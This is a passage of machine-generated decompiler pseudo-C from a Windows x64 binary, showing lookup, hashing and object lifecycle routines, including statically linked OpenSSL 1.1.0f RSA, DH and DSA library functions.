    v2 = sub_14003EF50(qword_140142B88, (__int64)&v12);
    if ( v2 )
      return *(unsigned int *)(v2[1] + 16i64);
    v1 = v14;
  }
  v4 = 0;
  v5 = 1052;
  do
  {
    v6 = (v5 + v4) / 2;
    v7 = (unsigned int *)((char *)&unk_1400E0F40 + 4 * v6);
    v8 = v1;
    v9 = &off_1400E5980[5 * *v7][-v1];
    while ( 1 )
    {
      v10 = *(_BYTE *)v8;
      if ( *(_BYTE *)v8 != v9[v8] )
        break;
      ++v8;
      if ( !v10 )
      {
        v11 = 0;
        goto LABEL_11;
      }
    }
    v11 = v10 < (unsigned __int8)v9[v8] ? -1 : 1;
LABEL_11:
    if ( v11 >= 0 )
    {
      if ( v11 <= 0 )
        break;
      v4 = v6 + 1;
    }
    else
    {
      v5 = (v5 + v4) / 2;
    }
  }
  while ( v4 < v5 );
  if ( v11 || !v7 )
    return 0i64;
  else
    return LODWORD(off_1400E5980[5 * *v7 + 2]);
}
// 1400E5980: using guessed type char *off_1400E5980[2];
// 140142B88: using guessed type __int64 qword_140142B88;

//----- (000000014002C840) ----------------------------------------------------
char **__fastcall sub_14002C840(char *a1, int a2)
{
  unsigned int v3; // eax
  char **result; // rax
  int v5; // eax
  int v6; // edi
  int v7; // eax
  int v8; // esi
  char **v9; // rbp
  char **v10; // rbx
  char **v11; // [rsp+60h] [rbp+18h] BYREF
  char **v12; // [rsp+68h] [rbp+20h] BYREF

  if ( !a2 )
  {
    v3 = sub_14002C720((__int64)a1);
    if ( v3 )
      return sub_14002C0F0(v3);
    v3 = sub_14002BF10((__int64)a1);
    if ( v3 )
      return sub_14002C0F0(v3);
  }
  v5 = sub_14003F5E0(0i64, 0, a1, -1);
  v6 = v5;
  if ( v5 <= 0 )
    return 0i64;
  v7 = sub_140047960(0, v5, 6);
  v8 = v7;
  if ( v7 < 0 )
    return 0i64;
  result = (char **)sub_14001D8E0(v7);
  v9 = result;
  if ( result )
  {
    v11 = result;
    sub_1400479D0((_BYTE **)&v11, 0, v6, 6, 0);
    sub_14003F5E0((__int64)v11, v6, a1, -1);
    v12 = v9;
    v10 = sub_14003FC70(0i64, (_BYTE **)&v12, v8);
    sub_14001D930(v9);
    return v10;
  }
  return result;
}

//----- (000000014002C970) ----------------------------------------------------
int __fastcall sub_14002C970(int *a1, __int64 a2)
{
  int v2; // r8d
  int result; // eax
  __int64 v4; // rcx
  __int64 *v5; // rdx
  int v6; // r8d
  int v7; // r8d
  char *v8; // rax
  __int64 v9; // rdx
  __int64 v10; // rdx
  char v11; // cl
  bool v12; // cf
  char *v13; // rax
  __int64 v14; // rdx
  __int64 v15; // rdx
  char v16; // cl

  v2 = *a1;
  result = *a1 - *(_DWORD *)a2;
  if ( *a1 != *(_DWORD *)a2 )
    return result;
  v4 = *((_QWORD *)a1 + 1);
  v5 = *(__int64 **)(a2 + 8);
  if ( !v2 )
  {
    result = *(_DWORD *)(v4 + 20) - *((_DWORD *)v5 + 5);
    if ( !result )
      return memcmp(*(const void **)(v4 + 24), (const void *)v5[3], *(int *)(v4 + 20));
    return result;
  }
  v6 = v2 - 1;
  if ( !v6 )
  {
    v13 = *(char **)v4;
    if ( *(_QWORD *)v4 )
    {
      v14 = *v5;
      if ( v14 )
      {
        v15 = v14 - (_QWORD)v13;
        while ( 1 )
        {
          v16 = *v13;
          v12 = (unsigned __int8)*v13 < (unsigned __int8)v13[v15];
          if ( *v13 != v13[v15] )
            break;
          ++v13;
          if ( !v16 )
            return 0;
        }
        return v12 ? -1 : 1;
      }
      return 1;
    }
    return -1;
  }
  v7 = v6 - 1;
  if ( !v7 )
  {
    v8 = *(char **)(v4 + 8);
    if ( v8 )
    {
      v9 = v5[1];
      if ( v9 )
      {
        v10 = v9 - (_QWORD)v8;
        while ( 1 )
        {
          v11 = *v8;
          v12 = (unsigned __int8)*v8 < (unsigned __int8)v8[v10];
          if ( *v8 != v8[v10] )
            break;
          ++v8;
          if ( !v11 )
            return 0;
        }
        return v12 ? -1 : 1;
      }
      return 1;
    }
    return -1;
  }
  if ( v7 == 1 )
    return *(_DWORD *)(v4 + 16) - *((_DWORD *)v5 + 4);
  else
    return 0;
}

//----- (000000014002CA60) ----------------------------------------------------
__int64 __fastcall sub_14002CA60(__int64 a1)
{
  __int64 v2; // rcx
  int v4; // r8d
  int v5; // eax
  __int64 v6; // r10
  int v7; // r9d
  __int64 v8; // r11
  char v9; // cl
  int v10; // edx

  v2 = *(_QWORD *)(a1 + 8);
  if ( *(_DWORD *)a1 )
  {
    switch ( *(_DWORD *)a1 )
    {
      case 1:
        v4 = sub_14003F020(*(char **)v2);
        break;
      case 2:
        v4 = sub_14003F020(*(char **)(v2 + 8));
        break;
      case 3:
        v4 = *(_DWORD *)(v2 + 16);
        break;
      default:
        return 0i64;
    }
  }
  else
  {
    v5 = *(_DWORD *)(v2 + 20);
    v6 = *(_QWORD *)(v2 + 24);
    v4 = v5 << 20;
    if ( v5 > 0 )
    {
      v7 = 0;
      v8 = (unsigned int)v5;
      do
      {
        v9 = v7;
        ++v6;
        v10 = (unsigned __int64)(715827883i64 * v7) >> 32;
        v7 += 3;
        v4 ^= *(unsigned __int8 *)(v6 - 1) << (v9 - 24 * ((v10 < 0) + (v10 >> 2)));
        --v8;
      }
      while ( v8 );
    }
  }
  return v4 & 0x3FFFFFFFu | (*(_DWORD *)a1 << 30);
}

//----- (000000014002CB20) ----------------------------------------------------
__int64 __fastcall sub_14002CB20(__int64 a1)
{
  __int64 result; // rax

  *(_DWORD *)(*(_QWORD *)(a1 + 8) + 16i64) = 0;
  result = *(_QWORD *)(a1 + 8);
  *(_DWORD *)(result + 32) |= 0xDu;
  return result;
}

//----- (000000014002CB40) ----------------------------------------------------
__int64 __fastcall sub_14002CB40(__int64 a1)
{
  __int64 result; // rax

  result = *(_QWORD *)(a1 + 8);
  ++*(_DWORD *)(result + 16);
  return result;
}

//----- (000000014002CB50) ----------------------------------------------------
void __fastcall sub_14002CB50(__int64 *a1)
{
  __int64 v1; // rax

  v1 = a1[1];
  if ( (*(_DWORD *)(v1 + 16))-- == 1 )
    sub_14003F4D0(a1[1]);
  sub_14001D930(a1);
}

//----- (000000014002CB90) ----------------------------------------------------
void sub_14002CB90()
{
  if ( qword_140142B88 )
  {
    sub_14003F010(qword_140142B88, 0);
    sub_14003EBA0(qword_140142B88, (void (__fastcall *)(_QWORD))sub_14002CB20);
    sub_14003EBA0(qword_140142B88, (void (__fastcall *)(_QWORD))sub_14002CB40);
    sub_14003EBA0(qword_140142B88, (void (__fastcall *)(_QWORD))sub_14002CB50);
    sub_14003ECA0(qword_140142B88);
    qword_140142B88 = 0i64;
  }
}
// 140142B88: using guessed type __int64 qword_140142B88;

//----- (000000014002CC10) ----------------------------------------------------
__int64 __fastcall sub_14002CC10(__int64 *a1, int a2)
{
  int v4; // eax
  __int64 v5; // rbx
  __int64 *v6; // rax
  __int64 v7; // rax
  int v9[58]; // [rsp+30h] [rbp-E8h] BYREF
  int *v10; // [rsp+120h] [rbp+8h] BYREF

  while ( 1 )
  {
    v10 = v9;
    v9[0] = a2;
    if ( qword_140142B90 )
    {
      v4 = sub_140029490((int *)qword_140142B90, (__int64)v9);
      if ( v4 >= 0 )
      {
        v5 = sub_140029880(qword_140142B90, v4);
        goto LABEL_6;
      }
    }
    v6 = (__int64 *)sub_14002BCB0(
                      (__int64)&v10,
                      (__int64)&off_1401350F0,
                      13,
                      8,
                      (__int64 (__fastcall *)(__int64, __int64))sub_140020A60);
    if ( !v6 )
      break;
    v5 = *v6;
    if ( !*v6 )
      break;
LABEL_6:
    if ( !v5 || (*(_BYTE *)(v5 + 8) & 1) == 0 )
      goto LABEL_10;
    a2 = *(_DWORD *)(v5 + 4);
  }
  v5 = 0i64;
LABEL_10:
  if ( a1 )
  {
    v7 = sub_14004D9A0(a2);
    if ( v7 )
    {
      *a1 = v7;
      return sub_14004D940(v7, a2);
    }
    *a1 = 0i64;
  }
  return v5;
}
// 1401350F0: using guessed type void *off_1401350F0;
// 140142B90: using guessed type __int64 qword_140142B90;

//----- (000000014002CD10) ----------------------------------------------------
__int64 __fastcall sub_14002CD10(_QWORD *a1, const char *a2, int a3)
{
  int v3; // ebx
  unsigned int v6; // ebx
  const char *i; // rax
  __int64 v8; // rdi
  int v10; // esi
  __int64 j; // rbp
  int v12; // eax
  __int64 v13; // rdi
  const char *v14; // rcx
  unsigned int v15; // edx
  const char *k; // r8
  __int64 v17; // [rsp+50h] [rbp+8h] BYREF

  v3 = a3;
  if ( a3 == -1 )
  {
    v6 = 0;
    for ( i = a2; *i; ++v6 )
    {
      if ( v6 >= 0x80000000 )
        break;
      ++i;
    }
    v3 = v6 & 0x7FFFFFFF;
  }
  if ( a1 )
  {
    v8 = sub_14004D9C0(&v17, (__int64)a2, v3);
    if ( v8 )
    {
      if ( !(unsigned int)sub_140025980(v17) )
        v8 = 0i64;
      sub_1400349C0(v17);
      *a1 = v17;
      return v8;
    }
    *a1 = 0i64;
  }
  v10 = 0;
  for ( j = 0i64; ; ++j )
  {
    v12 = 13;
    if ( qword_140142B90 )
      v12 = sub_1400296E0((unsigned int *)qword_140142B90) + 13;
    if ( v10 >= v12 )
      break;
    if ( j >= 0 )
    {
      if ( v10 >= 13 )
        v13 = sub_140029880(qword_140142B90, v10 - 13);
      else
        v13 = (__int64)*(&off_1401350F0 + j);
    }
    else
    {
      v13 = 0i64;
    }
    if ( (*(_BYTE *)(v13 + 8) & 1) == 0 )
    {
      v14 = *(const char **)(v13 + 16);
      v15 = 0;
      for ( k = v14; *k; ++v15 )
      {
        if ( v15 >= 0x80000000 )
          break;
        ++k;
      }
      if ( (v15 & 0x7FFFFFFF) == v3 && !strnicmp(v14, a2, v3) )
        return v13;
    }
    ++v10;
  }
  return 0i64;
}
// 1401350F0: using guessed type void *off_1401350F0;
// 140142B90: using guessed type __int64 qword_140142B90;

//----- (000000014002CE80) ----------------------------------------------------
void __fastcall sub_14002CE80(__int64 a1)
{
  if ( a1 )
  {
    if ( (*(_BYTE *)(a1 + 8) & 2) != 0 )
    {
      sub_14001D930(*(void **)(a1 + 16));
      sub_14001D930(*(void **)(a1 + 24));
      sub_14001D930((void *)a1);
    }
  }
}

//----- (000000014002CEF0) ----------------------------------------------------
void __fastcall sub_14002CEF0(__int64 a1)
{
  void (__fastcall *v2)(__int64); // rdx
  int v3; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
  {
    sub_140025D60((_DWORD *)(a1 + 96), -1, &v3);
    if ( v3 <= 0 )
    {
      v2 = *(void (__fastcall **)(__int64))(*(_QWORD *)(a1 + 8) + 64i64);
      if ( v2 )
        v2(a1);
      sub_140025890(*(_QWORD *)(a1 + 16));
      sub_140025FB0(9u, a1, (__int64 *)(a1 + 88));
      sub_140025BE0(*(_DWORD **)(a1 + 152));
      sub_140026A10(*(__int64 **)(a1 + 24));
      sub_140026A10(*(__int64 **)(a1 + 32));
      sub_140026A10(*(__int64 **)(a1 + 40));
      sub_140026A10(*(__int64 **)(a1 + 48));
      sub_140026A10(*(__int64 **)(a1 + 56));
      sub_140026A10(*(__int64 **)(a1 + 64));
      sub_140026A10(*(__int64 **)(a1 + 72));
      sub_140026A10(*(__int64 **)(a1 + 80));
      sub_14004DEF0(*(_DWORD ***)(a1 + 136));
      sub_14004DEF0(*(_DWORD ***)(a1 + 144));
      sub_14001D930(*(void **)(a1 + 128));
      sub_14001D930((void *)a1);
    }
  }
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (000000014002D000) ----------------------------------------------------
char **sub_14002D000()
{
  char **result; // rax

  result = (char **)qword_140142B98;
  if ( !qword_140142B98 )
  {
    result = sub_14004F540();
    qword_140142B98 = (__int64)result;
  }
  return result;
}
// 140142B98: using guessed type __int64 qword_140142B98;

//----- (000000014002D030) ----------------------------------------------------
__int64 __fastcall sub_14002D030(__int64 a1, int a2)
{
  return sub_140026190((__int64 *)(a1 + 88), a2);
}

//----- (000000014002D050) ----------------------------------------------------
__int64 sub_14002D050()
{
  return sub_14002D070(0i64);
}

//----- (000000014002D070) ----------------------------------------------------
__int64 __fastcall sub_14002D070(__int64 a1)
{
  int v1; // eax
  _DWORD *v3; // rax
  __int64 v4; // rbx
  _DWORD *v6; // rax
  char **v7; // rax
  __int64 v8; // rcx
  __int64 jumpbuf_sp; // rax
  unsigned int (__fastcall *v10)(__int64); // rdx
  int v11; // [rsp+20h] [rbp-18h]

  v3 = sub_14001DC20((unsigned int)(v1 + 112));
  v4 = (__int64)v3;
  if ( !v3 )
  {
    sub_140024610(4, 106, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_lib.c", 75);
    return 0i64;
  }
  v3[24] = 1;
  v6 = sub_140025C10();
  *(_QWORD *)(v4 + 152) = v6;
  if ( !v6 )
  {
    sub_140024610(4, 106, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_lib.c", 82);
    sub_14001D930((void *)v4);
    return 0i64;
  }
  v7 = (char **)qword_140142B98;
  if ( !qword_140142B98 )
  {
    v7 = sub_14004F540();
    qword_140142B98 = (__int64)v7;
  }
  *(_QWORD *)(v4 + 8) = v7;
  *(_DWORD *)(v4 + 100) = (_DWORD)v7[9] & 0xFFFFFBFF;
  if ( a1 )
  {
    if ( !(unsigned int)sub_140025980(a1) )
    {
      v11 = 92;
LABEL_10:
      sub_140024610(4, 106, 38, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_lib.c", v11);
LABEL_11:
      sub_14002CEF0(v4);
      return 0i64;
    }
    *(_QWORD *)(v4 + 16) = a1;
  }
  else
  {
    *(_QWORD *)(v4 + 16) = sub_14004F690();
  }
  v8 = *(_QWORD *)(v4 + 16);
  if ( v8 )
  {
    jumpbuf_sp = _except_get_jumpbuf_sp(v8);
    *(_QWORD *)(v4 + 8) = jumpbuf_sp;
    if ( !jumpbuf_sp )
    {
      v11 = 101;
      goto LABEL_10;
    }
  }
  *(_DWORD *)(v4 + 100) = *(_DWORD *)(*(_QWORD *)(v4 + 8) + 72i64) & 0xFFFFFBFF;
  if ( !(unsigned int)sub_140026350(9u, v4, (__int64 *)(v4 + 88)) )
    goto LABEL_11;
  v10 = *(unsigned int (__fastcall **)(__int64))(*(_QWORD *)(v4 + 8) + 56i64);
  if ( v10 && !v10(v4) )
  {
    sub_140024610(4, 106, 70, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\rsa\\rsa_lib.c", 113);
    goto LABEL_11;
  }
  return v4;
}
// 14002D08A: variable 'v1' is possibly undefined
// 1400206D0: using guessed type __int64 __fastcall _except_get_jumpbuf_sp(_QWORD);
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 14004F690: using guessed type __int64 sub_14004F690(void);
// 140142B98: using guessed type __int64 qword_140142B98;

//----- (000000014002D220) ----------------------------------------------------
__int64 __fastcall sub_14002D220(__int64 a1)
{
  int v1; // eax

  v1 = sub_140027260(*(_QWORD *)(a1 + 24));
  return sub_140027410(v1, -1);
}

//----- (000000014002D250) ----------------------------------------------------
__int64 __fastcall sub_14002D250(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  _DWORD *v6; // rcx

  v6 = *(_DWORD **)(a1 + 24);
  if ( !v6 && !a2 || !*(_QWORD *)(a1 + 32) && !a3 )
    return 0i64;
  if ( a2 )
  {
    sub_140026FF0(v6);
    *(_QWORD *)(a1 + 24) = a2;
  }
  if ( a3 )
  {
    sub_140026FF0(*(_DWORD **)(a1 + 32));
    *(_QWORD *)(a1 + 32) = a3;
  }
  if ( a4 )
  {
    sub_140026FF0(*(_DWORD **)(a1 + 40));
    *(_QWORD *)(a1 + 40) = a4;
  }
  return 1i64;
}

//----- (000000014002D2F0) ----------------------------------------------------
__int64 __fastcall sub_14002D2F0(__int64 a1, int a2, __int64 a3)
{
  return sub_140026520((unsigned int **)(a1 + 88), a2, a3);
}

//----- (000000014002D310) ----------------------------------------------------
void __fastcall sub_14002D310(__int64 a1)
{
  void (__fastcall *v2)(__int64); // rdx
  int v3; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
  {
    sub_140025D60((_DWORD *)(a1 + 104), -1, &v3);
    if ( v3 <= 0 )
    {
      v2 = *(void (__fastcall **)(__int64))(*(_QWORD *)(a1 + 120) + 40i64);
      if ( v2 )
        v2(a1);
      sub_140025890(*(_QWORD *)(a1 + 128));
      sub_140025FB0(6u, a1, (__int64 *)(a1 + 112));
      sub_140025BE0(*(_DWORD **)(a1 + 136));
      sub_140026A10(*(__int64 **)(a1 + 8));
      sub_140026A10(*(__int64 **)(a1 + 16));
      sub_140026A10(*(__int64 **)(a1 + 64));
      sub_140026A10(*(__int64 **)(a1 + 72));
      sub_14001D930(*(void **)(a1 + 80));
      sub_140026A10(*(__int64 **)(a1 + 96));
      sub_140026A10(*(__int64 **)(a1 + 32));
      sub_140026A10(*(__int64 **)(a1 + 40));
      sub_14001D930((void *)a1);
    }
  }
}

//----- (000000014002D400) ----------------------------------------------------
char **sub_14002D400()
{
  char **result; // rax

  result = (char **)qword_140142BA0;
  if ( !qword_140142BA0 )
  {
    result = sub_14004FB90();
    qword_140142BA0 = (__int64)result;
  }
  return result;
}
// 140142BA0: using guessed type __int64 qword_140142BA0;

//----- (000000014002D430) ----------------------------------------------------
__int64 sub_14002D430()
{
  return sub_14002D450(0i64);
}

//----- (000000014002D450) ----------------------------------------------------
__int64 __fastcall sub_14002D450(__int64 a1)
{
  int v1; // eax
  _DWORD *v3; // rax
  __int64 v4; // rbx
  _DWORD *v6; // rax
  char **v7; // rax
  std::ios_base *v8; // rcx
  __int64 v9; // rax
  unsigned int (__fastcall *v10)(__int64); // rdx

  v3 = sub_14001DC20((unsigned int)(v1 + 96));
  v4 = (__int64)v3;
  if ( !v3 )
  {
    sub_140024610(5, 105, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_lib.c", 60);
    return 0i64;
  }
  v3[26] = 1;
  v6 = sub_140025C10();
  *(_QWORD *)(v4 + 136) = v6;
  if ( !v6 )
  {
    sub_140024610(5, 105, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_lib.c", 67);
    sub_14001D930((void *)v4);
    return 0i64;
  }
  v7 = (char **)qword_140142BA0;
  if ( !qword_140142BA0 )
  {
    v7 = sub_14004FB90();
    qword_140142BA0 = (__int64)v7;
  }
  *(_QWORD *)(v4 + 120) = v7;
  *(_DWORD *)(v4 + 48) = *((_DWORD *)v7 + 12);
  if ( a1 )
  {
    if ( !(unsigned int)sub_140025980(a1) )
    {
      sub_140024610(5, 105, 38, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_lib.c", 77);
      goto LABEL_19;
    }
    *(_QWORD *)(v4 + 128) = a1;
  }
  else
  {
    *(_QWORD *)(v4 + 128) = sub_14004FC80();
  }
  v8 = *(std::ios_base **)(v4 + 128);
  if ( !v8 || (v9 = std::ios_base::precision(v8), (*(_QWORD *)(v4 + 120) = v9) != 0i64) )
  {
    *(_DWORD *)(v4 + 48) = *(_DWORD *)(*(_QWORD *)(v4 + 120) + 48i64);
    if ( (unsigned int)sub_140026350(6u, v4, (__int64 *)(v4 + 112)) )
    {
      v10 = *(unsigned int (__fastcall **)(__int64))(*(_QWORD *)(v4 + 120) + 32i64);
      if ( !v10 || v10(v4) )
        return v4;
      sub_140024610(5, 105, 70, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_lib.c", 98);
    }
  }
  else
  {
    sub_140024610(5, 105, 38, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\dh\\dh_lib.c", 86);
  }
LABEL_19:
  sub_14002D310(v4);
  return 0i64;
}
// 14002D46A: variable 'v1' is possibly undefined
// 14004FC80: using guessed type __int64 sub_14004FC80(void);
// 140142BA0: using guessed type __int64 qword_140142BA0;

//----- (000000014002D5F0) ----------------------------------------------------
__int64 __fastcall sub_14002D5F0(__int64 a1)
{
  __int64 v2; // rcx
  int v3; // ebx
  int v4; // eax

  v2 = *(_QWORD *)(a1 + 64);
  if ( v2 )
  {
    v3 = sub_140027260(v2);
  }
  else
  {
    v3 = -1;
    if ( *(_DWORD *)(a1 + 24) )
      v3 = *(_DWORD *)(a1 + 24);
  }
  v4 = sub_140027260(*(_QWORD *)(a1 + 8));
  return sub_140027410(v4, v3);
}

//----- (000000014002D640) ----------------------------------------------------
__int64 __fastcall sub_14002D640(__int64 a1, __int64 a2, __int64 a3)
{
  _DWORD *v5; // rcx

  v5 = *(_DWORD **)(a1 + 32);
  if ( !v5 )
  {
    if ( !a2 )
      return 0i64;
    goto LABEL_5;
  }
  if ( a2 )
  {
LABEL_5:
    sub_140026FF0(v5);
    *(_QWORD *)(a1 + 32) = a2;
  }
  if ( a3 )
  {
    sub_140026FF0(*(_DWORD **)(a1 + 40));
    *(_QWORD *)(a1 + 40) = a3;
  }
  return 1i64;
}

//----- (000000014002D6C0) ----------------------------------------------------
__int64 __fastcall sub_14002D6C0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  _DWORD *v6; // rcx

  v6 = *(_DWORD **)(a1 + 8);
  if ( !v6 && !a2 || !*(_QWORD *)(a1 + 16) && !a4 )
    return 0i64;
  if ( a2 )
  {
    sub_140026FF0(v6);
    *(_QWORD *)(a1 + 8) = a2;
  }
  if ( a3 )
  {
    sub_140026FF0(*(_DWORD **)(a1 + 64));
    *(_QWORD *)(a1 + 64) = a3;
  }
  if ( a4 )
  {
    sub_140026FF0(*(_DWORD **)(a1 + 16));
    *(_QWORD *)(a1 + 16) = a4;
  }
  if ( a3 )
    *(_DWORD *)(a1 + 24) = sub_140027260(a3);
  return 1i64;
}

//----- (000000014002D770) ----------------------------------------------------
__int64 __fastcall sub_14002D770(__int64 a1)
{
  return (unsigned int)((int)(sub_140027260(*(_QWORD *)(a1 + 8)) + 7) / 8);
}

//----- (000000014002D7A0) ----------------------------------------------------
__int64 __fastcall sub_14002D7A0(__int64 a1)
{
  return sub_140027260(*(_QWORD *)(a1 + 8));
}

//----- (000000014002D7C0) ----------------------------------------------------
__int64 __fastcall sub_14002D7C0(_QWORD *a1)
{
  __int64 v1; // r14
  _DWORD *v2; // rbp
  _DWORD *v3; // rdi
  _DWORD *v4; // rsi
  _DWORD *v5; // r12
  _DWORD *v6; // r15
  __int64 v8; // rcx
  _DWORD *v9; // rax
  __int64 v10; // rcx
  __int64 v11; // rcx

  v1 = 0i64;
  v2 = 0i64;
  v3 = 0i64;
  v4 = 0i64;
  v5 = 0i64;
  v6 = 0i64;
  if ( !a1 )
    goto LABEL_18;
  v1 = sub_14002D430();
  if ( !v1 )
    goto LABEL_18;
  v8 = a1[1];
  if ( v8 )
  {
    if ( !a1[3] )
      goto LABEL_18;
    if ( !a1[2] )
      goto LABEL_18;
    v2 = sub_140026F70(v8);
    v4 = sub_140026F70(a1[3]);
    v9 = sub_140026F70(a1[2]);
    v3 = v9;
    if ( !v2 || !v4 || !v9 || !(unsigned int)sub_14002D6C0(v1, (__int64)v2, (__int64)v9, (__int64)v4) )
      goto LABEL_18;
  }
  else if ( a1[3] || a1[2] )
  {
    goto LABEL_18;
  }
  v10 = a1[4];
  if ( v10 )
  {
    v2 = 0i64;
    v3 = 0i64;
    v4 = 0i64;
    v5 = sub_140026F70(v10);
    if ( !v5 )
      goto LABEL_18;
    v11 = a1[5];
    if ( v11 )
    {
      v6 = sub_140026F70(v11);
      if ( !v6 )
        goto LABEL_18;
    }
    v2 = 0i64;
    v3 = 0i64;
    v4 = 0i64;
    if ( !(unsigned int)sub_14002D640(v1, (__int64)v5, (__int64)v6) )
      goto LABEL_18;
  }
  else
  {
    v2 = 0i64;
    v3 = 0i64;
    v4 = 0i64;
    if ( a1[5] )
    {
LABEL_18:
      sub_140026FF0(v2);
      sub_140026FF0(v4);
      sub_140026FF0(v3);
      sub_140026FF0(v5);
      sub_140026FF0(v6);
      sub_14002D310(v1);
      return 0i64;
    }
  }
  return v1;
}
// 14002D82B: conditional instruction was optimized away because rcx.8==0

//----- (000000014002D940) ----------------------------------------------------
void __fastcall sub_14002D940(__int64 a1)
{
  void (__fastcall *v2)(__int64); // rdx
  int v3; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
  {
    sub_140025D60((_DWORD *)(a1 + 64), -1, &v3);
    if ( v3 <= 0 )
    {
      v2 = *(void (__fastcall **)(__int64))(*(_QWORD *)(a1 + 80) + 56i64);
      if ( v2 )
        v2(a1);
      sub_140025890(*(_QWORD *)(a1 + 88));
      sub_140025FB0(7u, a1, (__int64 *)(a1 + 72));
      sub_140025BE0(*(_DWORD **)(a1 + 96));
      sub_140026A10(*(__int64 **)(a1 + 8));
      sub_140026A10(*(__int64 **)(a1 + 16));
      sub_140026A10(*(__int64 **)(a1 + 24));
      sub_140026A10(*(__int64 **)(a1 + 32));
      sub_140026A10(*(__int64 **)(a1 + 40));
      sub_14001D930((void *)a1);
    }
  }
}
// 140025890: using guessed type __int64 __fastcall sub_140025890(_QWORD);

//----- (000000014002DA00) ----------------------------------------------------
__int64 __fastcall sub_14002DA00(__int64 a1)
{
  return *(_QWORD *)(a1 + 88);
}

//----- (000000014002DA10) ----------------------------------------------------
char **sub_14002DA10()
{
  char **result; // rax

  result = (char **)qword_140142BA8;
  if ( !qword_140142BA8 )
  {
    result = sub_140050730();
    qword_140142BA8 = (__int64)result;
  }
  return result;
}
// 140142BA8: using guessed type __int64 qword_140142BA8;

//----- (000000014002DA40) ----------------------------------------------------
__int64 __fastcall sub_14002DA40(__int64 a1, int a2)
{
  return sub_140026190((__int64 *)(a1 + 72), a2);
}

//----- (000000014002DA60) ----------------------------------------------------
__int64 sub_14002DA60()
{
  return sub_14002DA80(0i64);
}

//----- (000000014002DA80) ----------------------------------------------------
__int64 __fastcall sub_14002DA80(__int64 a1)
{
  int v1; // eax
  _DWORD *v3; // rax
  __int64 v4; // rbx
  _DWORD *v6; // rax
  char **v7; // rax
  __int64 v8; // rcx
  __int64 v9; // rax
  unsigned int (__fastcall *v10)(__int64); // rdx

  v3 = sub_14001DC20((unsigned int)(v1 + 56));
  v4 = (__int64)v3;
  if ( !v3 )
  {
    sub_140024610(10, 103, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_lib.c", 69);
    return 0i64;
  }
  v3[16] = 1;
  v6 = sub_140025C10();
  *(_QWORD *)(v4 + 96) = v6;
  if ( !v6 )
  {
    sub_140024610(10, 103, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_lib.c", 76);
    sub_14001D930((void *)v4);
    return 0i64;
  }
  v7 = (char **)qword_140142BA8;
  if ( !qword_140142BA8 )
  {
    v7 = sub_140050730();
    qword_140142BA8 = (__int64)v7;
  }
  *(_QWORD *)(v4 + 80) = v7;
  *(_DWORD *)(v4 + 48) = (_DWORD)v7[8] & 0xFFFFFBFF;
  if ( a1 )
  {
    if ( !(unsigned int)sub_140025980(a1) )
    {
      sub_140024610(10, 103, 38, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_lib.c", 86);
      goto LABEL_19;
    }
    *(_QWORD *)(v4 + 88) = a1;
  }
  else
  {
    *(_QWORD *)(v4 + 88) = sub_1400509C0();
  }
  v8 = *(_QWORD *)(v4 + 88);
  if ( !v8 || (v9 = sub_14001C740(v8), (*(_QWORD *)(v4 + 80) = v9) != 0i64) )
  {
    *(_DWORD *)(v4 + 48) = *(_DWORD *)(*(_QWORD *)(v4 + 80) + 64i64) & 0xFFFFFBFF;
    if ( (unsigned int)sub_140026350(7u, v4, (__int64 *)(v4 + 72)) )
    {
      v10 = *(unsigned int (__fastcall **)(__int64))(*(_QWORD *)(v4 + 80) + 48i64);
      if ( !v10 || v10(v4) )
        return v4;
      sub_140024610(10, 103, 70, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_lib.c", 107);
    }
  }
  else
  {
    sub_140024610(10, 103, 38, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\dsa\\dsa_lib.c", 95);
  }
LABEL_19:
  sub_14002D940(v4);
  return 0i64;
}
// 14002DA9A: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 1400509C0: using guessed type __int64 sub_1400509C0(void);
// 140142BA8: using guessed type __int64 qword_140142BA8;

//----- (000000014002DC20) ----------------------------------------------------
__int64 __fastcall sub_14002DC20(__int64 a1)
{
  __int64 v2; // rcx
  int v3; // ebx
  int v4; // eax

  if ( !*(_QWORD *)(a1 + 8) )
    return 0xFFFFFFFFi64;
  v2 = *(_QWORD *)(a1 + 16);
  if ( !v2 )
    return 0xFFFFFFFFi64;
  v3 = sub_140027260(v2);
  v4 = sub_140027260(*(_QWORD *)(a1 + 8));
  return sub_140027410(v4, v3);
}

//----- (000000014002DC80) ----------------------------------------------------
__int64 __fastcall sub_14002DC80(_QWORD *a1, __int64 a2, __int64 a3, __int64 a4)
{
  _DWORD *v6; // rcx

  v6 = (_DWORD *)a1[1];
  if ( !v6 && !a2 || !a1[2] && !a3 || !a1[3] && !a4 )
    return 0i64;
  if ( a2 )
  {
    sub_140026FF0(v6);
    a1[1] = a2;
  }
  if ( a3 )
  {
    sub_140026FF0((_DWORD *)a1[2]);
    a1[2] = a3;
  }
  if ( a4 )
  {
    sub_140026FF0((_DWORD *)a1[3]);
    a1[3] = a4;
  }
  return 1i64;
}

//----- (000000014002DD20) ----------------------------------------------------
__int64 __fastcall sub_14002DD20(__int64 a1, int a2, __int64 a3)
{
